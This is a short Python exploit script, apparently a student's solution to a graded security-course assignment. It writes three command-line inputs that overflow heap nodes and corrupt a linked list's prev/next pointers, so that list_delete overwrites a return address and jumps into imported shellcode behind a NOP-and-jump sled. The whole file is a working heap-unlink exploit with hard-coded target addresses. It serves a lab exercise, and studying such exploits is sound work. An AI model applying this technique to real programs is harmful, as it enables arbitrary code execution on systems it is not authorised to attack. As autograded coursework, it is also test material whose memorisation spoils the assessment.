#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd2f0
node_b = 0x080dd320
node_c = 0x080dd350

# # b *0x080489c9
# # c->prev = addr of node_a's buff + 8
# # c->next = addr of ret addr in list_delete: 0xfffef5c4

# # Example usage of node address with offset -- Feel free to ignore
a_plus_4 = pack("<I", node_a + 4)

# # Your code here
sys.stdout.buffer.write(b"\x90"*2 + b"\xeb\x04" + 4*b"a" + shellcode + b" ")
sys.stdout.buffer.write(40*b"b" + pack("<I", node_a + 8) + pack("<I", 0xfffef5c4) + b" ")
sys.stdout.buffer.write(b"c")